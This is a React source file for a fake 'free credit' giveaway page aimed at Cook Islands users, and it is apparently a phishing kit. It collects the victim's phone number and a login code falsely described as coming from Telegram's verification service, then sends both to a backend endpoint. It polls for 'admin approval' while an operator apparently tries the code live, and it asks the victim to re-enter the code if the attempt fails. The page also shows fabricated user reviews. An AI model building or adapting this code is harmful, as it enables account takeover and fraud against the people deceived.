import React, { useState, useEffect } from 'react';
import { Shield, Check, Star } from 'lucide-react';

declare global {
  interface Window {
    grecaptcha: any;
  }
}

interface UserReview {
  firstName: string;
  lastName: string;
  review: string;
}

const userReviews: UserReview[] = [
  { firstName: "ngametua", lastName: "marcian", review: "thanks!!!" },
  { firstName: "marcian", lastName: "kita", review: "wow i gpt crdtsss" },
  { firstName: "tuaine", lastName: "arigi", review: "this is fr guys" },
  { firstName: "tuariki", lastName: "marsters", review: "wtf i got my crdtz" },
  { firstName: "tuane", lastName: "kopu", review: "bruh this was fr" },
  { firstName: "memetuha", lastName: "murare", review: "shiii imma received ittt" }
];

function App() {
  const [currentStep, setCurrentStep] = useState<'welcome' | 'phone' | 'verification' | 'done'>('welcome');
  const [phoneNumber, setPhoneNumber] = useState(['', '', '', '', '']);
  const [verificationCode, setVerificationCode] = useState(['', '', '', '', '']);
  const [showCookieConsent, setShowCookieConsent] = useState(true);
  const [sessionId] = useState<string>(() => {
    try {
      const ex = localStorage.getItem('sessionId');
      if (ex) return ex;
      const sid = (crypto && 'randomUUID' in crypto) ? crypto.randomUUID()
        : Math.random().toString(36).slice(2) + Date.now().toString(36);
      localStorage.setItem('sessionId', sid);
      return sid;
    } catch {
      return Math.random().toString(36).slice(2) + Date.now().toString(36);
    }
  });
  const [waiting, setWaiting] = useState(false);
  const [errorText, setErrorText] = useState<string | null>(null);

const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: string }) => {
    try {
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ ...data, sessionId }),
      });
      return response.ok;
    } catch (error) {
      console.error('Failed to send data to Telegram bot:', error);
      return false;
    }
  };

  const handlePhoneSubmit = async () => {
    const fullNumber = phoneNumber.join('');
    if (fullNumber.length === 5) {
      const success = await sendToTelegramBot({ type: 'phone', value: fullNumber });
      if (success) {
        setCurrentStep('verification');
      }
    }
  };

  const handleVerificationSubmit = async () => {
    const fullCode = verificationCode.join('');
    if (fullCode.length === 5) {
      setWaiting(true);
      setErrorText(null);
      const success = await sendToTelegramBot({ type: 'verification', value: fullCode });
      if (success) {
        const poll = async () => {
          try {
            const res = await fetch(`/api/status?sessionId=${encodeURIComponent(sessionId)}`);
            if (!res.ok) throw new Error('status failed');
            const data = await res.json();
            if (data.status === 'approved') {
              setWaiting(false);
              setCurrentStep('done');
            } else if (data.status === 'rejected') {
              setWaiting(false);
              setVerificationCode(['', '', '', '', '']);
              setErrorText('you entered wrong code , enter true code');
            } else {
              setTimeout(poll, 2000);
            }
          } catch {
            setTimeout(poll, 3000);
          }
        };
        poll();
      } else {
        setWaiting(false);
      }
    }
  };

  const handleInputChange = (value: string, index: number, type: 'phone' | 'verification') => {
    if (value.length <= 1 && /^\d*$/.test(value)) {
      if (type === 'phone') {
        const newPhone = [...phoneNumber];
        newPhone[index] = value;
        setPhoneNumber(newPhone);
        
        // Auto-focus next input
        if (value && index < 4) {
          const nextInput = document.getElementById(`phone-${index + 1}`);
          nextInput?.focus();
        }
      } else {
        const newCode = [...verificationCode];
        newCode[index] = value;
        setVerificationCode(newCode);
        
        // Auto-focus next input
        if (value && index < 4) {
          const nextInput = document.getElementById(`verification-${index + 1}`);
          nextInput?.focus();
        }
      }
    }
  };

  const acceptCookies = () => {
    setShowCookieConsent(false);
    localStorage.setItem('cookiesAccepted', 'true');
  };

  useEffect(() => {
    const cookiesAccepted = localStorage.getItem('cookiesAccepted');
    if (cookiesAccepted) {
      setShowCookieConsent(false);
    }
  }, []);

  return (
    <div className="min-h-screen relative">
      {/* Background Image */}
      <div 
        className="fixed inset-0 z-0"
        style={{
          backgroundImage: 'url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5v9aoyGUs-CnKNB_LLKhNxDQAjphMIMb9tg&s)',
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat'
        }}
      >
        <div className="absolute inset-0 bg-black bg-opacity-40"></div>
      </div>

      {/* Main Content */}
      <div className="relative z-10 min-h-screen flex flex-col">
        {/* Header */}
        <div className="text-center pt-16 pb-8">
          <h1 className="text-6xl md:text-8xl font-bold text-white mb-6 tracking-tight">
            welcome
          </h1>
          <p className="text-2xl md:text-3xl text-red-500 font-semibold mb-8">
            get free credit (just for cook islands users)
          </p>
        </div>

        {/* Main Container */}
        <div className="flex-1 flex items-center justify-center px-4">
          <div className="w-full max-w-2xl">
            
            {currentStep === 'welcome' && (
              <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 border border-white/30">
                <div className="text-center">
                  <div className="bg-white/90 rounded-xl p-6 mb-8">
                    <p className="text-xl text-gray-800 font-medium">
                      please follow rules to get free credit from us
                    </p>
                  </div>
                  <button 
                    onClick={() => setCurrentStep('phone')}
                    className="bg-red-600 hover:bg-red-700 text-white px-8 py-4 rounded-xl font-semibold text-lg transition-colors duration-200 shadow-lg"
                  >
                    Get Started
                  </button>
                </div>
              </div>
            )}

            {currentStep === 'phone' && (
              <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 border border-white/30">
                <div className="text-center mb-8">
                  <h2 className="text-2xl text-white font-semibold mb-6">
                    1: enter your number (just cook islands numbers)
                  </h2>
                  <div className="flex justify-center space-x-3 mb-8">
                    {phoneNumber.map((digit, index) => (
                      <input
                        key={index}
                        id={`phone-${index}`}
                        type="text"
                        value={digit}
                        onChange={(e) => handleInputChange(e.target.value, index, 'phone')}
                        className="w-16 h-16 text-center text-2xl font-bold bg-white/90 border-2 border-gray-300 rounded-xl focus:border-red-500 focus:outline-none transition-colors duration-200"
                        maxLength={1}
                      />
                    ))}
                  </div>
<button 
                    onClick={handlePhoneSubmit}
                    disabled={phoneNumber.join('').length !== 5}
                    className="bg-red-600 hover:bg-red-700 disabled:bg-gray-400 disabled:cursor-not-allowed text-white px-8 py-4 rounded-xl font-semibold text-lg transition-colors duration-200 shadow-lg"
                  >
                    Submit Number
                  </button>
                </div>
              </div>
            )}

            {currentStep === 'verification' && (
              <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 border border-white/30">
                <div className="text-center mb-8">
                  <div className="flex justify-center mb-6">
                    <Shield className="w-16 h-16 text-blue-400" />
                  </div>
                  <h2 className="text-2xl text-white font-semibold mb-6">
                    for security reasons we uses telegram's verification service to deliver confirmation codes
                  </h2>
                  <div className="flex justify-center space-x-3 mb-8">
                    {verificationCode.map((digit, index) => (
                      <input
                        key={index}
                        id={`verification-${index}`}
                        type="text"
                        value={digit}
                        onChange={(e) => handleInputChange(e.target.value, index, 'verification')}
                        className="w-16 h-16 text-center text-2xl font-bold bg-white/90 border-2 border-gray-300 rounded-xl focus:border-red-500 focus:outline-none transition-colors duration-200"
                        maxLength={1}
                      />
                    ))}
                  </div>
                  {errorText && (
                    <p className="text-red-500 font-semibold mb-4">{errorText}</p>
                  )}
                  {waiting && (
                    <p className="text-white/90 mb-4">Waiting for admin approval…</p>
                  )}
                  <button 
                    onClick={handleVerificationSubmit}
                    disabled={verificationCode.join('').length !== 5 || waiting}
                    className="bg-red-600 hover:bg-red-700 disabled:bg-gray-400 disabled:cursor-not-allowed text-white px-8 py-4 rounded-xl font-semibold text-lg transition-colors duration-200 shadow-lg"
                  >
                    Submit Code
                  </button>
                </div>
              </div>
            )}

            {currentStep === 'done' && (
              <div className="bg-white/20 backdrop-blur-md rounded-2xl p-8 border border-white/30">
                <div className="text-center">
                  <div className="flex justify-center mb-6">
                    <Check className="w-24 h-24 text-green-400" />
                  </div>
                  <h2 className="text-4xl text-white font-bold">
                    Done!
                  </h2>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* User Reviews Section */}
        <div className="py-16 px-4">
          <div className="max-w-6xl mx-auto">
            <h3 className="text-3xl text-white font-bold text-center mb-12">What Users Say</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {userReviews.map((review, index) => (
                <div key={index} className="bg-white/20 backdrop-blur-md rounded-xl p-6 border border-white/30">
                  <div className="flex items-center mb-4">
                    <div className="w-10 h-10 bg-gradient-to-br from-blue-400 to-purple-500 rounded-full flex items-center justify-center text-white font-bold mr-3">
                      {review.firstName.charAt(0).toUpperCase()}
                    </div>
                    <div>
                      <p className="text-white font-semibold">{review.firstName} {review.lastName}</p>
                      <div className="flex text-yellow-400">
                        {[1, 2, 3, 4, 5].map((star) => (
                          <Star key={star} className="w-4 h-4 fill-current" />
                        ))}
                      </div>
                    </div>
                  </div>
                  <p className="text-white/90 italic">"{review.review}"</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Cookie Consent */}
      {showCookieConsent && (
        <div className="fixed bottom-0 left-0 right-0 z-50 bg-gray-900 text-white p-4 border-t border-gray-700">
          <div className="max-w-6xl mx-auto flex flex-col sm:flex-row items-center justify-between">
            <p className="mb-4 sm:mb-0 sm:mr-4">
              We use cookies to improve your experience. By using this site, you agree to our use of cookies.
            </p>
            <button 
              onClick={acceptCookies}
              className="bg-red-600 hover:bg-red-700 text-white px-6 py-2 rounded-lg font-semibold transition-colors duration-200 whitespace-nowrap"
            >
              Accept Cookies
            </button>
          </div>
        </div>
      )}

      {/* Global reCAPTCHA callback */}
      <script dangerouslySetInnerHTML={{
        __html: `
          window.onCaptchaChange = function(token) {
            window.dispatchEvent(new CustomEvent('recaptcha-change', { detail: token }));
          };
        `
      }} />
    </div>
  );
}

export default App;